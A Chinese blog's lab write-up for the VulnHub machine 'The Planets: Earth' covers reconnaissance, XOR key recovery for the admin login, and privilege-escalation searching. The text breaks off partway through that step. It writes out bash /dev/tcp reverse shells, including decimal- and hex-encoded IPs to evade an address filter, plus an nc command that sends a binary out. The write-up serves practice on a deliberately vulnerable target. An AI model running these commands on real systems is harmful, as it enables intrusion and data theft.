<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.0.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" integrity="sha256-yIDrPSXHZdOZhAqiBP7CKzIwMQmRCJ8UeB8Jo17YC4o=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.28/fancybox/fancybox.css" integrity="sha256-6cQIC71/iBIYXFK+0RHAvwmjwWzkWd+r7v/BX3/vZDc=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"z9m8r8.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.19.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>

    <meta name="description" content="该文章暂无概述">
<meta property="og:type" content="article">
<meta property="og:title" content="The Planets：Earth">
<meta property="og:url" content="https://z9m8r8.github.io/2023/08/23/the-planets%EF%BC%9Aearth/index.html">
<meta property="og:site_name" content="Ghost&#39;s Blog">
<meta property="og:description" content="该文章暂无概述">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2023-08-22T16:45:00.000Z">
<meta property="article:modified_time" content="2023-12-23T13:25:44.461Z">
<meta property="article:author" content="Ghost">
<meta property="article:tag" content="Vulnhub 靶场">
<meta property="article:tag" content="反弹 shell">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="https://z9m8r8.github.io/2023/08/23/the-planets%EF%BC%9Aearth/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://z9m8r8.github.io/2023/08/23/the-planets%EF%BC%9Aearth/","path":"2023/08/23/the-planets：earth/","title":"The Planets：Earth"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>The Planets：Earth | Ghost's Blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">Ghost's Blog</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">人若无名，便可专心练剑！</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">1. 信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E9%9D%B6%E6%9C%BA-ip"><span class="nav-text">1.1. 主机发现【靶机 IP】</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-text">1.2. 端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-%E6%9C%8D%E5%8A%A1%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">1.3. Web 服务信息收集</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB"><span class="nav-text">2. 渗透攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AE%A1%E7%90%86%E9%97%A8%E6%88%B7%E7%99%BB%E5%BD%95"><span class="nav-text">2.1. 管理门户登录</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%BC%B9-shell"><span class="nav-text">2.2. 反弹 shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-text">2.3. 提权</span></a></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Ghost"
      src="/images/avatar.png">
  <p class="site-author-name" itemprop="name">Ghost</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">123</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">25</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">52</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="https://github.com/z9m8r8" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;z9m8r8" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://www.cnblogs.com/z9m8r8" title="博客园 → https:&#x2F;&#x2F;www.cnblogs.com&#x2F;z9m8r8" rel="noopener me" target="_blank"><i class="fa-solid fa-blog fa-fw"></i>博客园</a>
      </span>
  </div>
  <div class="cc-license animated" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
  </div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://z9m8r8.github.io/2023/08/23/the-planets%EF%BC%9Aearth/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.png">
      <meta itemprop="name" content="Ghost">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Ghost's Blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="The Planets：Earth | Ghost's Blog">
      <meta itemprop="description" content="该文章暂无概述">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          The Planets：Earth
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2023-08-23 00:45:00" itemprop="dateCreated datePublished" datetime="2023-08-23T00:45:00+08:00">2023-08-23</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2023-12-23 21:25:44" itemprop="dateModified" datetime="2023-12-23T21:25:44+08:00">2023-12-23</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>1.2k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>4 分钟</span>
    </span>
</div>

            <div class="post-description">该文章暂无概述</div>
        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><blockquote>
<p><strong>靶机介绍及下载</strong>：<a
target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/the-planets-earth,755/">The Planets:
Earth ~ VulnHub</a></p>
</blockquote>
<h2 id="信息收集">1. 信息收集</h2>
<h3 id="主机发现靶机-ip">1.1. 主机发现【靶机 <code>IP</code>】</h3>
<ul>
<li>主机探测的方法及工具介绍可以参见：<a
target="_blank" rel="noopener" href="https://www.cnblogs.com/z9m8r8/articles/15574388.html">主动信息收集之主机发现
- z9m8r8 - 博客园</a>，以 <code>netdiscover</code> 探测为例：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># netdiscover -i eth0 -r 192.168.159.0/24</span></span><br></pre></td></tr></table></figure>
<figure>
<img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/The%20Planets%20Earth%20netdiscover.jpg"
alt="The Planets Earth netdiscover.jpg" />
<figcaption aria-hidden="true">The Planets Earth
netdiscover.jpg</figcaption>
</figure>
<ul>
<li><strong>靶机</strong>
<code>IP</code>：<code>192.168.159.141</code></li>
</ul>
<h3 id="端口扫描">1.2. 端口扫描</h3>
<ul>
<li>端口扫描的方法和工具介绍可以参见：<a
target="_blank" rel="noopener" href="https://www.cnblogs.com/z9m8r8/articles/15615756.html">主动信息收集之端口扫描
- z9m8r8 - 博客园</a>，以 <code>nmap</code> 扫描为例：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># nmap -sS 192.168.159.141 -p1-65535</span></span><br></pre></td></tr></table></figure>
<figure>
<img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/The%20Planets%20Earth%20nmap%20port.jpg"
alt="The Planets Earth nmap port.jpg" />
<figcaption aria-hidden="true">The Planets Earth nmap
port.jpg</figcaption>
</figure>
<ul>
<li>简要分析，由上可知开放了22，80，443端口，22 端口的 <code>ssh</code>
可尝试弱口令爆破【非优选，后面用 hydra
试了下没成功，初步推断不存在弱口令，hydra 使用可参见：<a
target="_blank" rel="noopener" href="https://www.cnblogs.com/z9m8r8/articles/16592988.html">密码破解 -
z9m8r8 - 博客园</a>】，80和443端口可浏览器访问，目录遍历和用
<code>nmap</code> 等扫描进一步获取可用信息。</li>
</ul>
<h3 id="web-服务信息收集">1.3. Web 服务信息收集</h3>
<ul>
<li>浏览器访问靶机</li>
</ul>
<figure>
<img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/The%20Planets%20Earth%20https.jpg"
alt="The Planets Earth https.jpg" />
<figcaption aria-hidden="true">The Planets Earth https.jpg</figcaption>
</figure>
<ul>
<li>没注意到有可用的信息，利用 <code>dirsearch</code>
尝试目录遍历，依旧没发现有价值信息，继续用 <code>nmap</code>
进一步获取信息。</li>
</ul>
<figure>
<img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/The%20Planets%20Earth%20nmap%20dns.jpg"
alt="The Planets Earth nmap dns.jpg" />
<figcaption aria-hidden="true">The Planets Earth nmap
dns.jpg</figcaption>
</figure>
<ul>
<li>看到两个 <strong>DNS 解析</strong>，修改 hosts【让
<code>terratest.earth.local</code> 和<code>earth.local</code> 指向靶机
<code>IP</code> )】 ，浏览器访问+目录遍历</li>
</ul>
<figure>
<img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/The%20Planets%20Earth%20https%20earth-local%20.jpg"
alt="The Planets Earth https earth-local .jpg" />
<figcaption aria-hidden="true">The Planets Earth https earth-local
.jpg</figcaption>
</figure>
<figure>
<img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/The%20Planets%20Earth%20https%20terratest-earth-local%20.jpg"
alt="The Planets Earth https terratest-earth-local .jpg" />
<figcaption aria-hidden="true">The Planets Earth https
terratest-earth-local .jpg</figcaption>
</figure>
<ul>
<li>目录遍历结果</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># dirsearch -u &quot;https://terratest.earth.local/&quot;</span></span><br></pre></td></tr></table></figure>
<figure>
<img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/The%20Planets%20Earth%20dirsearch%20%20terratest-earth-local%20.jpg"
alt="The Planets Earth dirsearch terratest-earth-local .jpg" />
<figcaption aria-hidden="true">The Planets Earth dirsearch
terratest-earth-local .jpg</figcaption>
</figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># dirsearch -u &quot;https://earth.local/&quot;    </span></span><br></pre></td></tr></table></figure>
<figure>
<img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/The%20Planets%20Earth%20dirsearch%20%20earth-local%20.jpg"
alt="The Planets Earth dirsearch earth-local .jpg" />
<figcaption aria-hidden="true">The Planets Earth dirsearch earth-local
.jpg</figcaption>
</figure>
<ul>
<li>分别访问 <a
target="_blank" rel="noopener" href="https://earth.local/admin/login">https://earth.local/admin/login</a>
【可考虑弱口令，SQL 注入等】和 <a
target="_blank" rel="noopener" href="https://terratest.earth.local/robots.txt">https://terratest.earth.local/robots.txt</a>
反馈如下：</li>
</ul>
<figure>
<img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/The%20Planets%20Earth%20https%20earth-local-admin-login.jpg"
alt="The Planets Earth https earth-local-admin-login.jpg" />
<figcaption aria-hidden="true">The Planets Earth https
earth-local-admin-login.jpg</figcaption>
</figure>
<figure>
<img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/The%20Planets%20Earth%20https%20terratest-earth-local-robots-txt.jpg"
alt="The Planets Earth https terratest-earth-local-robots-txt.jpg" />
<figcaption aria-hidden="true">The Planets Earth https
terratest-earth-local-robots-txt.jpg</figcaption>
</figure>
<ul>
<li>进一步访问 <a
target="_blank" rel="noopener" href="https://terratest.earth.local/testingnotes.txt">https://terratest.earth.local/testingnotes.txt</a>
【后缀可以猜一下或去爆破均可】</li>
</ul>
<figure>
<img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/The%20Planets%20Earth%20https%20terratest-earth-local-testingnotes-txt.jpg"
alt="The Planets Earth https terratest-earth-local-testingnotes-txt.jpg" />
<figcaption aria-hidden="true">The Planets Earth https
terratest-earth-local-testingnotes-txt.jpg</figcaption>
</figure>
<figure>
<img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/The%20Planets%20Earth%20https%20terratest-earth-local-testingnotes-txt-en-zh.jpg"
alt="The Planets Earth https terratest-earth-local-testingnotes-txt-en-zh.jpg" />
<figcaption aria-hidden="true">The Planets Earth https
terratest-earth-local-testingnotes-txt-en-zh.jpg</figcaption>
</figure>
<figure>
<img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/The%20Planets%20Earth%20https%20terratest-earth-local-testdata-txt.jpg"
alt="The Planets Earth https terratest-earth-local-testdata-txt.jpg" />
<figcaption aria-hidden="true">The Planets Earth https
terratest-earth-local-testdata-txt.jpg</figcaption>
</figure>
<ul>
<li>简要分析，由此可知前面发送消息使用 <code>XOR</code>
作为加密算法，而当前可获得之前已发送消息的密文，密文和testdata.txt
<code>XOR</code> 便可知密钥 key，admin/login 登录的账号为 terra，猜测
key 可能是 terra 登录的密码。</li>
<li>密钥 key 的获取，将 testdata.txt 转为 16
进制，在于之前的密文做异或。</li>
</ul>
<blockquote>
<p>According to radiometric dating estimation and other evidence, Earth
formed over 4.5 billion years ago. Within the first billion years of
Earth's history, life appeared in the oceans and began to affect Earth's
atmosphere and surface, leading to the proliferation of anaerobic and,
later, aerobic organisms. Some geological evidence indicates that life
may have arisen as early as 4.1 billion years ago.</p>
<hr />
<p>4163636f7264696e6720746f20726164696f6d657472696320646174696e6720657374696d6174696f6e20616e64206f746865722065766964656e63652c20456172746820666f726d6564206f76657220342e352062696c6c696f6e2079656172732061676f2e2057697468696e207468652066697273742062696c6c696f6e207965617273206f66204561727468277320686973746f72792c206c69666520617070656172656420696e20746865206f6365616e7320616e6420626567616e20746f2061666665637420456172746827732061746d6f73706865726520616e6420737572666163652c206c656164696e6720746f207468652070726f6c696665726174696f6e206f6620616e6165726f62696320616e642c206c617465722c206165726f626963206f7267616e69736d732e20536f6d652067656f6c6f676963616c2065766964656e636520696e646963617465732074686174206c696665206d617920686176652061726973656e206173206561726c7920617320342e312062696c6c696f6e2079656172732061676f2e</p>
</blockquote>
<ul>
<li>已知的密文有三条，通过逐条测试得发现 testdata.txt 与 2402111b1a0……
相对应，并解出 key 为 <code>earthclimatechangebad4humans</code>
，具体操作如下：</li>
<li><a target="_blank" rel="noopener" href="https://www.toolhelper.cn/SymmetricEncryption/XOR">异或
加密/解密 - 在线工具</a></li>
</ul>
<figure>
<img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/The%20Planets%20Earth%20https%20earth-local%20key.jpg"
alt="The Planets Earth https earth-local key.jpg" />
<figcaption aria-hidden="true">The Planets Earth https earth-local
key.jpg</figcaption>
</figure>
<ul>
<li><a target="_blank" rel="noopener" href="http://ku51.net/ox2str/">在线字符串转16进制 -
16进制转换成字符串</a></li>
</ul>
<figure>
<img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/The%20Planets%20Earth%20https%20earth-local%20key-hex-string.jpg"
alt="The Planets Earth https earth-local key-hex-string.jpg" />
<figcaption aria-hidden="true">The Planets Earth https earth-local
key-hex-string.jpg</figcaption>
</figure>
<ul>
<li>如果不放心可以用这个 key 重新发下 testdata.txt 作以验证。</li>
</ul>
<h2 id="渗透攻击">2. 渗透攻击</h2>
<h3 id="管理门户登录">2.1. 管理门户登录</h3>
<ul>
<li>用前面得到 <code>terra/earthclimatechangebad4humans</code> 在
admin/login 页面登录测试。</li>
</ul>
<figure>
<img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/The%20Planets%20Earth%20https%20earth-local-admin-login-terra.jpg"
alt="The Planets Earth https earth-local-admin-login-terra.jpg" />
<figcaption aria-hidden="true">The Planets Earth https
earth-local-admin-login-terra.jpg</figcaption>
</figure>
<ul>
<li>成功进入，发现可以远程执行命令，查找 flag</li>
</ul>
<figure>
<img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/The%20Planets%20Earth%20https%20earth-local-user-flag.jpg"
alt="The Planets Earth https earth-local-user-flag.jpg" />
<figcaption aria-hidden="true">The Planets Earth https
earth-local-user-flag.jpg</figcaption>
</figure>
<ul>
<li>只找到个 user_flag.txt，用
<code>cat /var/earth_web/user_flag.txt</code> 获取
flag，成功拿到一个<code>user_flag_3353b67d6437f07ba7d34afd7d2fc27d</code>
。</li>
</ul>
<h3 id="反弹-shell">2.2. 反弹 shell</h3>
<ul>
<li>尝试写个反弹 shell</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.159.152/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
<figure>
<img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/The%20Planets%20Earth%20https%20earth-local-admin-login-ip-shell.jpg"
alt="The Planets Earth https earth-local-admin-login-ip-shell.jpg" />
<figcaption aria-hidden="true">The Planets Earth https
earth-local-admin-login-ip-shell.jpg</figcaption>
</figure>
<ul>
<li>禁止远程连接！看其他人的说法是对点分十进制的 IP
有限制，所以考虑绕过，对 IP
进行16进制或10进制转换【经测试两种都可绕过】，后面以转成10进制【<a
target="_blank" rel="noopener" href="https://www.ipaddressguide.com/ip">IPv4 Address to IP Decimal
Conversion IPAddressGuide</a>】为例演示。</li>
<li>攻击机开启开启监听</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># nc -nvlp 4444</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/3232276376/4444 0&gt;&amp;1    <span class="comment">#10进制</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/0xc0.0xa8.0x9f.0x98/4444 0&gt;&amp;1   <span class="comment">#16进制</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>成功反弹！</strong></li>
</ul>
<figure>
<img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/The%20Planets%20Earth%20https%20earth-local-admin-login-ip-de-shell.jpg"
alt="The Planets Earth https earth-local-admin-login-ip-de-shell.jpg" />
<figcaption aria-hidden="true">The Planets Earth https
earth-local-admin-login-ip-de-shell.jpg</figcaption>
</figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bash-5.1$ <span class="built_in">id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=48(apache) gid=48(apache) <span class="built_in">groups</span>=48(apache)</span><br><span class="line">bash-5.1$ <span class="built_in">cd</span> /root</span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line">bash: <span class="built_in">cd</span>: /root: Permission denied</span><br></pre></td></tr></table></figure>
<ul>
<li>权限不够，考虑提权。</li>
</ul>
<h3 id="提权">2.3. 提权</h3>
<ul>
<li><strong>查询可提权命令</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
<ul>
<li>执行结果</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">bash-5.1$ find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">/usr/bin/chage</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/reset_root</span><br><span class="line">/usr/sbin/grub2-set-bootflag</span><br><span class="line">/usr/sbin/pam_timestamp_check</span><br><span class="line">/usr/sbin/unix_chkpwd</span><br><span class="line">/usr/sbin/mount.nfs</span><br><span class="line">/usr/lib/polkit-1/polkit-agent-helper-1</span><br></pre></td></tr></table></figure>
<ul>
<li>有个reset_root，尝试执行</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bash-5.1$ reset_root</span><br><span class="line">reset_root</span><br><span class="line">CHECKING IF RESET TRIGGERS PRESENT...</span><br><span class="line">RESET FAILED, ALL TRIGGERS ARE NOT PRESENT.</span><br></pre></td></tr></table></figure>
<ul>
<li>传回 kali 调试排查原因</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash-5.1$ nc 192.168.159.152 4445 &lt; /usr/bin/reset_root</span><br><span class="line">nc 192.168.159.152 4445 &lt; /usr/bin/reset_root</span><br></pre></td></tr></table></figure>
<figure>
<img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/The%20Planets%20Earth%20https%20earth-local-admin-login-shell-reset_root.jpg"
alt="The Planets Earth https earth-local-admin-login-shell-reset_root.jpg" />
<figcaption aria-hidden="true">The Planets Earth https
earth-local-admin-login-shell-reset_root.jpg</figcaption>
</figure>
<ul>
<li>用strace调试</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># strace  ./reset_root</span></span><br></pre></td></tr></table></figure>
<figure>
